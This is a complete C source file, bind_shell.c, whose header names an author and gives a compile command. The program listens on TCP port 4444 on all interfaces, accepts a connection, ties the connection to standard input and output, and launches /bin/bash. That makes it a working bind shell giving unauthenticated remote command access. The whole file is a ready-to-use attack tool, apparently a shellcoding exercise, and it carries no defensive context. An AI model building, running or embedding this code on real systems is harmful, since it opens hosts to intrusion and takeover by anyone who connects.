/*
Filename:	bind_shell.c
Author:		Jules Adriaens
Compile:	gcc -o bind_shell bind_shell.c
*/

#include <stdio.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>

int host_sockfd;		// host file descriptor
int clnt_sockfd;		// client file descriptor
struct sockaddr_in host_addr;	// host address
struct sockaddr_in clnt_addr;	// client address


int main()
{
	// Create TCP socket
	host_sockfd = socket(AF_INET, SOCK_STREAM, 0);

	// sockaddr structure so that we can receive connections
	host_addr.sin_family = AF_INET;
	host_addr.sin_addr.s_addr = INADDR_ANY;
	host_addr.sin_port = htons(4444);

	// Bind socket
	bind(host_sockfd, (struct sockaddr *) &host_addr, sizeof(host_addr));

	// Listen on socket
	listen(host_sockfd, 5);

	// Accept connection
	clnt_sockfd = accept(host_sockfd, NULL, NULL);

	// Duplicate file descriptors
	dup2(clnt_sockfd, 0);
	dup2(clnt_sockfd, 1);
	dup2(clnt_sockfd, 2);

	// Spawn /bin/bash
	execve("/bin/bash", NULL, NULL);

	return 0;
}
